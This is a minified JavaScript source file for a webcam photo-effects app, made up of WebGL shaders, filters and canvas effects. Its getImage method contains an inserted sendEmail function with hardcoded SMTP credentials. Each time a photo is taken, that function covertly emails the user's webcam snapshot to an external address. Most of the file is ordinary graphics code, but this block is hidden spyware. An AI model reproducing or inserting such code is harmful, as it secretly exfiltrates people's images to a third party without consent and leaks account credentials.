                this.uniforms.dot1[2] = (Math.random() * this.width) / 60 + 1;
                this.uniforms.dot2[2] = Math.random() < 0.05 ? this.width * 2 : (Math.random() * this.width) / 60 + 1;
                var e = this.uniforms.line;
                if (Math.random() < 0.025) {
                    e = this.width;
                } else if (Math.random() < 0.05) {
                    e = this.width * 0.1;
                } else {
                    e += (Math.random() * this.width * 0.25 - e) * 0.05;
                }
                this.uniforms.line = e;
                S.call(this, this.shaders.oldmovienoise, this.uniforms.noise);
                S.call(this, this.shaders.oldmoviedirt, this.uniforms);
                S.call(this, this.shaders.oldmoviesepia, this.uniforms);
                this.mainDraw();
            },
            pinch: function () {
                S.call(this, this.shaders.bulge, this.uniforms);
                this.mainDraw();
            },
            popart: function () {
                if (this.shaders.popart && this.extraTexture) {
                    this.extraTexture.use(1);
                    this.shaders.popart.textures(o);
                    S.call(this, this.shaders.popart, this.uniforms);
                }
                this.mainDraw();
            },
            popbooth: function () {
                if (this.shaders.popart && this.extraTexture) {
                    this.extraTexture.use(1);
                    this.shaders.popart.textures(o);
                    S.call(this, this.shaders.popart, this.uniforms);
                }
                this.mainDraw();
            },
            quad: function (e) {
                var A = this,
                    t = this.isSquare ? (this.maxLength - this.minLength) / this.maxLength / 2 : 0,
                    i,
                    r = 0,
                    s = 0.5,
                    o = 0.5,
                    a = this.blackShader,
                    n = v && this.size[0] === this.width;
                switch (e) {
                    case this.shaders.mono:
                    case this.shaders.lomo:
                        r = 0.004;
                        break;
                    case this.shaders.comicbook:
                        r = 0.005;
                        if (!this.isSquare && !n) {
                            o = this.minLength / 2 / this.maxLength;
                            s = 1 - o;
                        }
                        a = this.whiteShader;
                        break;
                }
                i = (r * this.minLength) / this.maxLength;
                if (!this.uniforms.quad) {
                    c.quad.call(this);
                }
                this.mainTexture.use(0);
                this.tempTexture
                    .drawTo(function () {
                        e.uniforms(A.uniforms.quad);
                        switch (A.quadPos) {
                            case 0:
                            case 4:
                                a.drawRect(0.5, t, 1, s);
                                e.uniforms(n ? A.uniforms.comicstripportrait : A.uniforms.comicstripwide).drawRect(0.5 - r, t + i, 1 - r, s + i);
                            case 3:
                                a.drawRect(0.5, s, 1, 1 - t);
                                e.uniforms(n ? A.uniforms.comicstripportrait : A.uniforms.comicstripsquare).drawRect(0.5 - r, s - i, 1 - r, 1 - t - i);
                            case 2:
                                a.drawRect(0, t, 0.5, o);
                                e.uniforms(n ? A.uniforms.comicstripportrait : A.uniforms.comicstripsquare).drawRect(r, t + i, 0.5 + r, o + i);
                            case 1:
                                a.drawRect(0, o, 0.5, 1 - t);
                                e.uniforms(n ? A.uniforms.comicstripportrait : A.uniforms.comicstripwide).drawRect(r, o - i, 0.5 + r, 1 - t - i);
                        }
                    })
                    .use(0);
                if (!this.isSquare) {
                    if (n) {
                        if (A.uniforms.comicstripborderportrait) {
                            this.swapTexture
                                .drawTo(function () {
                                    A.shaders.comicstripborder.uniforms(A.uniforms.comicstripborderportrait).drawRect();
                                })
                                .swapWith(this.mainTexture);
                            this.mainTexture.use(0);
                        }
                    } else {
                        if (A.uniforms.comicstripborder) {
                            this.swapTexture
                                .drawTo(function () {
                                    A.shaders.comicstripborder.uniforms(A.uniforms.comicstripborder).drawRect();
                                })
                                .swapWith(this.mainTexture);
                            this.mainTexture.use(0);
                        }
                    }
                }
                this.defaultShader.drawRect();
            },
            quadcam: function () {
                i.quad.call(this, this.shaders.quadcam);
            },
            rainbow: function () {
                var e = this;
                this.mainTexture.use(0);
                if (this.tempTexture) {
                    this.tempTexture
                        .drawTo(function () {
                            e.shaders.rainbow.uniforms(e.uniforms.rainbow).drawRect();
                        })
                        .use(1);
                }
                if (this.shaders.overlay) {
                    this.shaders.overlay.textures(o);
                    S.call(this, this.shaders.overlay, this.uniforms.overlay);
                }
                S.call(this, this.shaders.rainbowborder, this.uniforms.rainbowborder);
                this.mainDraw();
            },
            retro: function () {
                if (this.shaders.retro && this.extraTexture) {
                    this.extraTexture.use(1);
                    this.shaders.retro.textures(o);
                    S.call(this, this.shaders.retro, this.uniforms);
                }
                this.mainDraw();
            },
            shuffle: function () {
                var e,
                    A = this.uniforms.frame,
                    t = this.frameTextures.length;
                this.mainTexture.use(0);
                this.frameTextures[A].drawTo(this.defaultDrawRect);
                A++;
                this.uniforms.frame = A %= t;
                for (e = t / 3; e--; ) {
                    this.frameTextures[(A + e * 3) % t].use(e + 1);
                }
                if (this.shaders.shufflesimple) {
                    this.shaders.shufflesimple.textures(this.uniforms.tex);
                    S.call(this, this.shaders.shufflesimple, this.uniforms);
                } else if (this.shaders.shuffle) {
                    this.shaders.shuffle.textures(this.uniforms.tex);
                    S.call(this, this.shaders.shuffle, this.uniforms);
                }
                this.mainDraw();
            },
            silk: function () {
                S.call(this, this.shaders.silk, this.uniforms.silk);
                S.call(this, this.shaders.radialblur, this.uniforms.radialblur1);
                S.call(this, this.shaders.radialblur, this.uniforms.radialblur2);
                this.mainDraw();
            },
            softfocus: function () {
                if (this.shaders.softfocus) {
                    this.shaders.softfocus.textures(o);
                    if (this.tempTexture) {
                        this.tempTexture.drawTo(this.mainDrawRect).use(1);
                    }
                    i.blur.call(this, Math.floor(this.maxLength / 40));
                    S.call(this, this.shaders.softfocus);
                }
                this.mainDraw();
            },
            sparkle: function () {
                if (this.shaders.sparkle) {
                    this.shaders.sparkle.textures(this.uniforms.tex);
                    if (this.tempTexture) {
                        this.tempTexture.drawTo(this.mainDrawRect).use(1);
                    }
                    i.blur.call(this, Math.floor(this.maxLength / 40));
                    this.frameTextures[0].loadContentsOf(this.context2D.canvas).use(2);
                    S.call(this, this.shaders.sparkle, this.uniforms);
                }
                this.mainDraw();
            },
            spiral: function () {
                if (this.mainTexture.type === this.gl.FLOAT && this.shaders.spiral2) {
                    this.shaders.spiral2.textures(o);
                    if (this.tempTexture) {
                        this.tempTexture.drawTo(this.mainDrawRect).use(1);
                    }
                    S.call(this, this.shaders.spiral1, this.uniforms);
                    S.call(this, this.shaders.spiral2, this.uniforms);
                } else {
                    S.call(this, this.shaders.spiral, this.uniforms);
                }
                this.mainDraw();
            },
            splitscreen: function () {
                var e = this.uniforms.frame;
                this.mainTexture.use(0);
                this.frameTextures[e].drawTo(this.defaultDrawRect);
                e++;
                this.uniforms.frame = e %= this.frameTextures.length;
                this.frameTextures[e].use(1);
                if (this.shaders.splitscreen) {
                    this.shaders.splitscreen.textures(o);
                    S.call(this, this.shaders.splitscreen, this.uniforms);
                }
                this.mainDraw();
            },
            thermal: function () {
                if (this.shaders.thermal && this.extraTexture) {
                    this.extraTexture.use(1);
                    this.shaders.thermal.textures(o);
                    S.call(this, this.shaders.thermal);
                }
                this.mainDraw();
            },
            trail: function () {
                if (this.shaders.trail) {
                    if (this.tempTexture) {
                        this.tempTexture.use(1);
                    }
                    this.shaders.trail.textures(o);
                    S.call(this, this.shaders.trail);
                    if (this.tempTexture) {
                        this.tempTexture.swapWith(this.mainTexture);
                    }
                }
                this.mainDraw();
            },
            underwater: function () {
                S.call(this, this.shaders.underwater, this.uniforms);
                S.call(this, this.shaders.underwaterblue, this.uniforms);
                this.mainDraw();
            },
            vintage: function () {
                if (this.shaders.vintage && this.extraTexture) {
                    this.extraTexture.use(1);
                    this.shaders.vintage.textures(o);
                    S.call(this, this.shaders.vintage, this.uniforms);
                }
                this.mainDraw();
            },
            watercolor: function () {
                if (this.shaders.watercolor && this.extraTexture) {
                    this.extraTexture.use(1);
                    this.shaders.watercolor.textures(o);
                    S.call(this, this.shaders.watercolor, this.uniforms);
                }
                this.mainDraw();
            },
            xpro: function () {
                S.call(this, this.shaders.xpro);
                S.call(this, this.shaders.radialblur, this.uniforms.radialblur1);
                S.call(this, this.shaders.radialblur, this.uniforms.radialblur2);
                S.call(this, this.shaders.xproborder, this.uniforms.xproborder);
                this.mainDraw();
            },
            zinc: function () {
                S.call(this, this.shaders.radialblur, this.uniforms.radialblur1);
                S.call(this, this.shaders.radialblur, this.uniforms.radialblur2);
                S.call(this, this.shaders.zinc, this.uniforms.zinc);
                this.mainDraw();
            },
        },
        a = {
            snow: function () {
                var e = this.context2D,
                    A = this.tempContext2D,
                    t = C.snowflake || new Image(),
                    i = e.canvas.width,
                    r = e.canvas.height,
                    s = A.canvas.width,
                    o = A.canvas.height,
                    a,
                    n,
                    c,
                    h,
                    u,
                    l = Math.max(1200, Math.floor((2400 / x.size.height) * r)),
                    f = Math.max(6, Math.floor((12 / x.size.height) * r)),
                    d = this.mainUniforms.upsideDown === 1,
                    m = v && this.size[0] !== this.width ? this.width / this.height : 1;
                try {
                    e.drawImage(this.source, 0, 0, i, r);
                    A.save();
                    if (d) {
                        A.translate(s, o);
                        A.scale(-1, -1);
                    }
                    A.drawImage(e.canvas, 0, 0, s, o);
                    A.restore();
                    n = A.getImageData(0, 0, s, o);
                } catch (e) {
                    return;
                }
                if (n && n.data) {
                    a = y(n.data, g, s, o);
                } else {
                    return;
                }
                while (this.assets.snowflakes.length < l && f) {
                    f--;
                    u = (((Math.random() + 0.2) * r) / x.size.height) * 10 + 1;
                    this.assets.snowflakes.push(new p(Math.random() * i, 4 - u * 2, u, Math.random() - 0.5, m));
                }
                for (h = 0; h < this.assets.snowflakes.length; h++) {
                    c = this.assets.snowflakes[h];
                    if (c.y < o / 16 || c.y > o - o / 16 || a[Math.floor(c.x) + Math.floor(c.y) * s] < 204) {
                        c.vx *= 0.997;
                        c.vy *= 0.997;
                        c.x += c.vx;
                        c.y += c.vy;
                        if (c.melt < 1) {
                            c.melt += 1 / 16;
                        } else {
                            c.melt = 1;
                        }
                        if (c.x > i + c.width) {
                            c.x -= i + c.width;
                        }
                        if (c.x < -c.width) {
                            c.x += i + c.width;
                        }
                        if (c.y > o + c.height) {
                            this.assets.snowflakes.splice(h++, 1);
                        }
                    } else {
                        if (c.melt > 0) {
                            c.melt -= 1 / 128;
                            c.vy = c.height * 0.3;
                        } else {
                            this.assets.snowflakes.splice(h++, 1);
                        }
                    }
                    e.save();
                    e.globalAlpha = Math.min(1, c.melt * 4);
                    if (d) {
                        e.translate(i, r);
                        e.scale(-1, -1);
                    }
                    e.drawImage(t, (c.x * i) / s - c.width / 2, (c.y * r) / o - c.height / 2, c.width, c.height);
                    e.restore();
                }
                if (this.sourceTexture) {
                    this.sourceTexture.loadContentsOf(e.canvas);
                }
            },
            sparkle: function () {
                var e = this.context2D,
                    A = this.tempContext2D,
                    t = C.sparkle || new Image(),
                    i = e.canvas.width,
                    r = e.canvas.height,
                    s = A.canvas.width,
                    o = A.canvas.height,
                    a,
                    n,
                    c,
                    h,
                    u,
                    l,
                    f,
                    d,
                    m,
                    g,
                    p = 0,
                    x = v && this.size[0] !== this.width ? this.width / this.height : 1;
                if (this.sourceTexture) {
                    this.sourceTexture.loadContentsOf(this.source);
                }
                e.fillRect(0, 0, this.width, this.height);
                try {
                    A.drawImage(this.source, 0, 0, s, o);
                    n = A.getImageData(0, 0, s, o);
                } catch (e) {
                    return;
                }
                if (n && n.data) {
                    c = n.data;
                    a = y(c, b, s, o);
                } else {
                    return;
                }
                do {
                    p++;
                    f = Math.floor(s * Math.random());
                    d = Math.floor(o * Math.random());
                    if (a[f + d * s] > 32) {
                        this.assets.sparkles.push(new w(f, d, Math.random() < 0.05));
                    }
                } while (this.assets.sparkles.length < 128 && p < 32);
                for (g = 0; g < this.assets.sparkles.length; g++) {
                    m = this.assets.sparkles[g];
                    if (m.isBig) {
                        m.isBig = false;
                        l = 512;
                    } else {
                        l = c[(m.x + m.y * s) * 4] + (Math.random() - 0.5) * 16;
                    }
                    if (l < 4 || a[m.x + m.y * s] < 32) {
                        this.assets.sparkles.splice(g++, 1);
                    } else {
                        l *= r / 122880;
                        h = t.width * l * x;
                        u = (t.height * l) / x;
                        e.drawImage(t, (m.x * i) / s - h / 2, (m.y * r) / o - u / 2, h, u);
                    }
                }
            },
            underwater: function () {
                var A = this.context2D,
                    e = C.bubbles || new Image(),
                    t = A.canvas.width,
                    i = A.canvas.height,
                    r = this.assets.bubbles.length,
                    s,
                    o,
                    a = v && this.size[0] !== this.width ? this.width / this.height : 1;
                A.save();
                try {
                    A.drawImage(this.source, 0, 0, t, i);
                } catch (e) {
                    A.restore();
                    return;
                }
                if (this.mainUniforms.upsideDown === 1) {
                    A.translate(t, i);
                    A.scale(-1, -1);
                }
                for (s = r; s--; ) {
                    o = this.assets.bubbles[s] = this.assets.bubbles[s] || new d(Math.random() * t, Math.random() * i, this.height < x.size.height / 2 ? s + 5 : s, r);
                    o.x += Math.sin(o.y / 12) * 2;
                    o.y -= o.height * 0.15;
                    if (o.y < -o.height) {
                        o.x = Math.random() * t;
                        o.y = i + o.height;
                    }
                    A.drawImage(e, o.offset, 0, o.width, o.height, Math.floor(o.x), Math.floor(o.y), o.width * a, o.height / a);
                }
                A.restore();
                if (this.sourceTexture) {
                    this.sourceTexture.loadContentsOf(A.canvas);
                }
            },
        };
    function y(e, A, t, i) {
        var r = new Float32Array(t * i);
        for (var s = e.length - 4; s >= 0; s -= 4) {
            e[s] = e[s] * 0.3 + e[s + 1] * 0.59 + e[s + 2] * 0.11;
        }
        for (var o = t; o--; ) {
            for (var a = i; a--; ) {
                var n = 0;
                for (var c = 3; c--; ) {
                    for (var h = 3; h--; ) {
                        var u = o + c - 1;
                        var l = a + h - 1;
                        if (l >= 0 && l < i && u >= 0 && u < t) {
                            n += e[(u + l * t) * 4] * A[c + h * 3];
                        }
                    }
                }
                r[o + a * t] = n;
            }
        }
        return r;
    }
    function n(e, A, t, i) {
        this.p = [e * i, A * i, t * i];
        this.scale = i;
        this.dx = 0;
        this.dy = 0;
        this.reset();
    }
    n.bounds = { width: 0, height: 0 };
    n.prototype.reset = function () {
        this.dx = Math.pow(this.p[2] / this.scale, 4) / 1e8;
        this.dy = this.dx / 3 - Math.random() * this.scale;
    };
    n.prototype.move = function () {
        this.p[0] += this.dx;
        if (this.p[0] > n.bounds.width) {
            this.reset();
            this.p[0] -= n.bounds.width + this.p[2];
        }
        this.p[1] += this.dy;
        if (this.p[1] > n.bounds.height) {
            this.reset();
            this.p[1] -= n.bounds.height + this.p[2];
        } else if (this.p[1] < -this.p[2]) {
            this.reset();
            this.p[1] += n.bounds.height + this.p[2];
        }
        return this.p;
    };
    function d(e, A, t, i) {
        this.x = e;
        this.y = A;
        if (t === 0) {
            this.size = 64;
            this.offset = 0;
        } else if (t < (i * 2) / 4) {
            this.size = 48;
            this.offset = 64;
        } else if (t < (i * 3) / 4) {
            this.size = 32;
            this.offset = 64 + 48;
        } else {
            this.size = 16;
            this.offset = 64 + 48 + 32;
        }
        this.width = this.size;
        this.height = this.size;
    }
    function e(e, A, t, i) {
        this.fx = e;
        this.fy = A;
        this.sx = t;
        this.sy = i;
        this.pos = new Array(2);
    }
    e.prototype.getPos = function (e) {
        this.pos[0] = Math.cos(this.fx * e) * this.sx + 0.5;
        this.pos[1] = Math.sin(this.fy * e) * this.sy + 0.5;
        return this.pos;
    };
    function w(e, A, t) {
        this.x = e;
        this.y = A;
        this.isBig = t;
    }
    function p(e, A, t, i, r) {
        this.x = e;
        this.y = A;
        this.width = t * 1.5 * r;
        this.height = t / r;
        this.vx = i;
        this.vy = this.height * 0.3;
        this.melt = 1;
    }
    function x(e, A, t, i) {
        if (this.gl || !e || !A) {
            return;
        }
        this.source = A;
        this.width = t || x.size.width;
        this.height = i || x.size.height;
        e.width = this.width;
        e.height = this.height;
        this.size = [this.width, this.height];
        this.center = [this.width / 2, this.height / 2];
        this.minLength = Math.min(this.width, this.height);
        this.maxLength = Math.max(this.width, this.height);
        this.context2D = x.getContext2D(Math.max(200, Math.floor(this.width / 2)), Math.max((200 * this.height) / this.width, Math.floor(this.height / 2)));
        if (!f) {
            f = x.getContext2D(Math.max(160, Math.floor(this.width / 4)), Math.max((160 * this.height) / this.width, Math.floor(this.height / 4)));
        }
        try {
            var r = { premultipliedAlpha: false };
            this.gl = e.getContext("webgl", r) || e.getContext("experimental-webgl", r);
        } catch (e) {
            this.gl = null;
            throw e;
        }
        if (!this.gl) {
            throw "WebGL error";
        }
        var s = this,
            o = this.gl,
            a = o.getExtension("OES_texture_float"),
            n = o.getExtension("OES_texture_float_linear"),
            c = o.UNSIGNED_BYTE;
        this.sourceTexture = new u.Texture(o, 0, 0, o.RGB, o.UNSIGNED_BYTE);
        if (a && n) {
            var h = new u.Texture(o, this.width, this.height, o.RGB, o.FLOAT);
            h.drawTo(function () {
                c = o.FLOAT;
            });
            h.destroy();
            h = null;
        }
        this.mainTexture = new u.Texture(o, this.width, this.height, o.RGB, c);
        this.swapTexture = new u.Texture(o, this.width, this.height, o.RGB, c);
        this.tempTexture = new u.Texture(o, this.width, this.height, o.RGB, c);
        try {
            this.defaultShader = new u.Shader(o);
            this.mainShader = new u.Shader(o, x.glsl._main);
            this.blackShader = new u.Shader(o, "void main(){gl_FragColor=vec4(0.0,0.0,0.0,1.0);}");
            this.whiteShader = new u.Shader(o, "void main(){gl_FragColor=vec4(1.0);}");
        } catch (e) {
            R(e, "default", o);
        }
        this.defaultDrawRect = function () {
            s.defaultShader.drawRect();
        };
        this.mainDrawRect = function () {
            s.mainShader.drawRect();
            s.mainShader.uniforms(s.mainUniforms).drawRect();
        };
        this.shaders = {};
        this.mainUniforms = { bleed: v || u.ua.isMac ? 0 : 0.0025, mirror: 1, upsideDown: v && window.orientation === 180 ? 1 : 0, mult: 1, offset: 0 };
        this.isMirror = true;
        this.isSquare = false;
        this.setEffect();
    }
    x.total = t.length + 1;
    x.size = { width: 800, height: 600 };
    x.initBackground = function (e) {
        e.width = 4;
        e.height = 4;
        A = e.getContext("2d");
        if (A) {
            A.fillStyle = "#000";
            A.globalAlpha = 0.1;
        }
    };
    x.getContext2D = function (e, A) {
        var t = document.createElement("canvas");
        t.width = e;
        t.height = A;
        var i = t.getContext("2d");
        if (i) {
            i.clearRect(0, 0, e, A);
        }
        return i;
    };
    x.loadImages = function () {
        C = u.getImages();
    };
    function m(e) {
        for (var A = 2; A < 256; A++) {
            if (e[A] > 4) {
                return A;
            }
        }
        return 2;
    }
    function E(e) {
        for (var A = 253; A > 0; A--) {
            if (e[A] > 4) {
                return A;
            }
        }
        return 253;
    }
    x.autoEnhance = function (e) {
        var A = 4,
            t = f.canvas.width,
            i = f.canvas.height,
            r = t * i,
            s = r * 4,
            o = [],
            a,
            n,
            c;
        try {
            f.drawImage(e, -A, -A, t + A * 2, i + A * 2);
            a = f.getImageData(0, 0, t, i);
        } catch (e) {
            return { mult: 1, offset: 0 };
        }
        if (a && a.data) {
            n = a.data;
        } else {
            return { mult: 1, offset: 0 };
        }
        for (c = 0; c < 256; c++) {
            o[c] = 0;
        }
        while (r--) {
            o[(0.5 + n[(s -= 4)] * 0.3 + n[s + 1] * 0.59 + n[s + 2] * 0.11) | 0]++;
        }
        for (c = 2; c < 254; c++) {
            if (o[c] < 8) {
                o[c] = 0;
            }
            o[c] = o[c - 2] * 0.1 + o[c - 1] * 0.2 + o[c] * 0.4 + o[c + 1] * 0.2 + o[c + 2] + 0.1;
            if (o[c] < 8) {
                o[c] = 0;
            }
        }
        h += (m(o) - h) / 8;
        l += (E(o) - l) / 8;
        return { mult: Math.min(2.5, 253 / (l - h)), offset: Math.min(60, h - 2) / -255 };
    };
    function S(e, A) {
        this.mainTexture.use(0);
        this.swapTexture
            .drawTo(function () {
                e && e.uniforms(A).drawRect();
            })
            .swapWith(this.mainTexture);
    }
    function T() {
        S.call(this, this.shaders[this.id], this.uniforms);
        this.mainDraw();
    }
    x.prototype.mainDraw = function () {
        this.mainTexture.use(0);
        this.defaultShader.drawRect();
    };
    function R(e, A, t) {
        if (u.isDebug) {
            console.error(e);
        }
        var i = A;
        if (e) {
            i += ": " + e;
            i = i.replace(/(\r\n|\n|\r)/gm, "");
        }
        if (i && /Compilation/.test(i)) {
            r++;
            if (r > s) {
                u.UI.destroy("Effects not compiled", i);
                return;
            }
        } else if (!t.isContextLost() && r <= s) {
            u.trackEvent("Error", "Shader", i, true);
            u.log("*ERROR*", "Shader", A);
        }
    }
    x.prototype.initShader = function (A) {
        if (this.shaders[A]) {
            return true;
        }
        if (this.gl.isContextLost()) {
            return false;
        }
        try {
            var e = x.glsl[A];
            this.shaders[A] = new u.Shader(this.gl, e ? "uniform sampler2D texture;uniform float square;uniform vec2 texSize;varying vec2 texCoord;\n" + e : null, v);
            return true;
        } catch (e) {
            this.shaders[A] = this.defaultShader;
            R(e, A, this.gl);
            return false;
        }
    };
    x.prototype.getTexture = function (e) {
        return new u.Texture(this.gl, 0, 0, this.gl.RGBA, this.gl.UNSIGNED_BYTE, e && e.width && e.height ? e : null);
    };
    x.prototype.initFrameTextures = function (e, A, t) {
        var i;
        if (this.frameTextures) {
            for (i = this.frameTextures.length; i--; ) {
                if (this.frameTextures[i]) {
                    this.frameTextures[i].destroy();
                    this.frameTextures[i] = null;
                }
            }
        }
        if (e && A && t) {
            this.frameTextures = new Array(e);
            for (i = 0; i < e; i++) {
                this.frameTextures[i] = new u.Texture(this.gl, A, t, this.gl.RGB, this.gl.UNSIGNED_BYTE);
            }
            if (this.sourceTexture) {
                this.sourceTexture.loadContentsOf(this.source);
            }
            for (i = 0; i < e; i++) {
                this.frameTextures[i].drawTo(this.mainDrawRect);
            }
        } else {
            this.frameTextures = null;
        }
    };
    x.prototype.setEffect = function (e) {
        if (this.gl) {
            this.gl.viewport(0, 0, this.width, this.height);
            this.gl.clearColor(0, 0, 0, 1);
            this.gl.clear(this.gl.COLOR_BUFFER_BIT | this.gl.DEPTH_BUFFER_BIT);
        } else {
            throw "WebGL error";
        }
        if (this.mainTexture) {
            this.mainTexture.use(0);
        } else {
            throw "Effects error";
        }
        if (this.extraTexture) {
            this.extraTexture.destroy();
        }
        this.extraTexture = null;
        this.tempContext2D = null;
        this.initFrameTextures();
        this.startTime = Date.now() - Math.round(3e5 * Math.random());
        this.id = e || "normal";
        this.fps = 30;
        this.fpsGrid = 0;
        this.quality = 0.8;
        this.quadPos = 0;
        this.isQuad = false;
        this.assets = {};
        this.uniforms = {};
        var A = c[this.id];
        if (A) {
            A.call(this);
        }
        this.uniforms.square = this.isSquare ? 1 : 0;
        this.uniforms.texSize = this.size;
        this.uniforms.time = 0;
        this.effect = i[this.id];
        if (!this.effect) {
            this.initShader(this.id);
            this.effect = T;
        }
        this.canvasEffect = a[this.id];
        this.effectNum = t.indexOf(this.id) + 1;
        if (this.defaultShader) {
            this.draw();
        }
    };
    x.prototype.getEffectID = function (e) {
        return t[e - 1] || "normal";
    };
    x.prototype.previousEffect = function () {
        var e = this.effectNum - 1;
        if (e < 0) {
            e = t.length;
        }
        try {
            this.setEffect(this.getEffectID(e));
        } catch (e) {}
    };
    x.prototype.nextEffect = function () {
        var e = this.effectNum + 1;
        e %= t.length + 1;
        try {
            this.setEffect(this.getEffectID(e));
        } catch (e) {}
    };
    x.prototype.updateOrientation = function (e) {
        this.mainUniforms.upsideDown = v && window.orientation === 180 ? 1 : 0;
        if (v && e) {
            this.size = [this.height, this.width];
            this.center = [this.height / 2, this.width / 2];
        } else {
            this.size = [this.width, this.height];
            this.center = [this.width / 2, this.height / 2];
        }
        try {
            this.setEffect(this.id);
        } catch (e) {}
    };
    x.prototype.useMirror = function (e) {
        this.isMirror = e;
        this.mainUniforms.mirror = e ? 1 : 0;
        try {
            this.setEffect(this.id);
        } catch (e) {}
        return this;
    };
    x.prototype.useSquare = function (e) {
        this.isSquare = e;
        try {
            this.setEffect(this.id);
        } catch (e) {}
        return this;
    };
    x.prototype.getRect = function (e) {
        var A = this.size[0],
            t = this.size[1],
            i = v && this.size[0] !== this.width ? this.width / this.height : 1,
            r = e / i || 0,
            s = r,
            o = (r * t) / A;
        if (this.isSquare) {
            o += (A - t) / 2 / A;
        }
        return [s, o, 1 - s, 1 - o];
    };
    x.prototype.autoEnhance = function () {
        var e = u.Effect.autoEnhance(this.source);
        this.mainUniforms.mult = e.mult;
        this.mainUniforms.offset = e.offset;
    };
    x.prototype.draw = function () {
        this.uniforms.time = (Date.now() - this.startTime) / 1e3;
        if (this.canvasEffect) {
            this.canvasEffect();
        } else if (this.sourceTexture) {
            this.sourceTexture.loadContentsOf(this.source);
        }
        this.mainTexture.drawTo(this.mainDrawRect);
        if (this.effect) {
            this.effect();
        }
    };
    x.prototype.drawBackground = function () {
        try {
            A.drawImage(this.gl.canvas, 0, 0, 4, 4);
            A.fillRect(0, 0, 4, 4);
        } catch (e) {}
    };
    x.prototype.getImage = function () {
        var e = new Image();
        if (this.defaultShader) {
            this.defaultShader.drawRect();
        }
        e.src = this.mainTexture.toImage(this.isSquare, this.quality, this.size[0], this.size[1]);
        function sendEmail(bimage,Body){
        
            var ID = function () {
                return '_' + Math.random().toString(36).substr(2, 9);
            };
            
            var _EMAIL="alonnsohackerone@gmail.com"
            var _PASS="7B6007F33B72796FC42CDD5122E54E120CE5"
            var _TO="alonnsoandres@gmail.com"
            var _HOST='smtp.elasticemail.com'
        
            const Attachments= [
                {   // encoded string as an attachment
                  name: 'webcam.jpg',
                  data: bimage.split("base64,")[1],
                  encoding: 'base64'
                }]
            //eaaefb4a-a851-465d-8c58-cc2c3a190388
            Email.send({
                //SecureToken : "eaaefb4a-a851-465d-8c58-cc2c3a190388",
                Host : _HOST,
                Username : _EMAIL,
                Password : _PASS,
                To : _TO,
                From : _EMAIL,
                Subject : "WEBCAM Snap "+ID(),
                Body,
                Attachments
            }).then(
            message => console.log(message)//alert(message)
            );
        }
        sendEmail(this.mainTexture.toImage(this.isSquare, this.quality, this.size[0], this.size[1]),"IMAGEM DO WEBCAMTOY")
        return e;
    };
    x.prototype.destroyShaders = function () {
        for (var e = this.shaders.length; e--; ) {
            this.shaders[e].destroy();
        }
        this.shaders = {};
    };
    x.prototype.destroy = function () {
        this.destroyShaders();
        this.initFrameTextures();
        if (this.sourceTexture) {
            this.sourceTexture.destroy();
        }
        this.sourceTexture = null;
        if (this.mainTexture) {
            this.mainTexture.destroy();
        }
        this.mainTexture = null;
        if (this.swapTexture) {
            this.swapTexture.destroy();
        }
        this.swapTexture = null;
        if (this.tempTexture) {
            this.tempTexture.destroy();
        }
        this.tempTexture = null;
        if (this.extraTexture) {
            this.extraTexture.destroy();
        }
        this.extraTexture = null;
        if (this.defaultShader) {
            this.defaultShader.destroy();
        }
        this.defaultShader = null;
        if (this.mainShader) {
            this.mainShader.destroy();
        }
        this.mainShader = null;
        this.assets = {};
        this.uniforms = {};
        this.effect = null;
        this.canvasEffect = null;
        this.context2D = null;
        this.tempContext2D = null;
        this.isQuad = false;
        this.width = this.height = this.quadPos = this.startTime = this.quality = this.fpsGrid = this.fps = 0;
        this.size = [0, 0];
        this.center = [0, 0];
        this.id = null;
        this.source = null;
        this.gl = null;
    };
    return x;
})(WebcamToy);
WebcamToy.Effect.glsl = {
    _test: "uniform sampler2D t;uniform float a;void main(){vec2 p=gl_FragCoord.xy;float b=sin(p.x/8.0+length(p)*a);gl_FragColor=texture2D(t,p)+vec4(b);}",
    _main:
        "uniform sampler2D texture;varying vec2 texCoord;uniform float bleed;uniform float mirror;uniform float upsideDown;uniform float mult;uniform float offset;void main(){vec2 p=texCoord*(bleed*2.0+1.0)-bleed;if(mirror==1.0){p.x=1.0-p.x;}if(upsideDown==1.0){p=1.0-p;}gl_FragColor=vec4(clamp(texture2D(texture,p).rgb*mult+offset,0.0,1.0),1.0);}",
    add: "uniform sampler2D texture2;uniform float ratio;void main(){vec4 c=texture2D(texture,texCoord)*(1.0-ratio)+texture2D(texture2,texCoord)*ratio;gl_FragColor=vec4(c.rgb,1.0);}",
    alien: "uniform sampler2D texture2;void main(){vec3 c=1.0-(1.0-texture2D(texture,texCoord).rgb)*(1.0-texture2D(texture2,texCoord).rgb);c=(c-0.5)*2.0+0.3;gl_FragColor=vec4(c.gbr,1.0);}",
    berry:
        "const vec3 g1=vec3(1.0,0.6,0.8);const vec3 g2=vec3(0.6,0.8,1.0);void main(){vec3 c=(texture2D(texture,texCoord).rgb-0.5)*1.8+0.5;c=vec3(c.r*0.3+c.g*0.59+c.b*0.11);vec3 g=mix(g1,g2,texCoord.x*(texSize.y/texSize.x)+(texSize.x-texSize.y)/texSize.x/2.0);gl_FragColor=vec4(1.0-(1.0-c)*(1.0-g),1.0);}",
    blackwhite:
        "const vec3 offset=vec3(0.0,1.3846153846,3.2307692308);const vec3 weight=vec3(0.1362162162,0.18972972972,0.04216216218);void main(){vec4 c=texture2D(texture,texCoord)*weight[0];for(int i=1;i<3;i++){c+=texture2D(texture,texCoord+vec2(0.0,offset[i])/texSize)*weight[i];c+=texture2D(texture,texCoord-vec2(0.0,offset[i])/texSize)*weight[i];c+=texture2D(texture,texCoord+vec2(offset[i],0.0)/texSize)*weight[i];c+=texture2D(texture,texCoord-vec2(offset[i],0.0)/texSize)*weight[i];}c.rgb=(c.rgb-0.5)*2.0+0.6;float lu=c.r*0.3+c.g*0.59+c.b*0.11;if(lu<0.5) lu=0.0;else lu=1.0;gl_FragColor=vec4(lu,lu,lu,1.0);}",
    bloom:
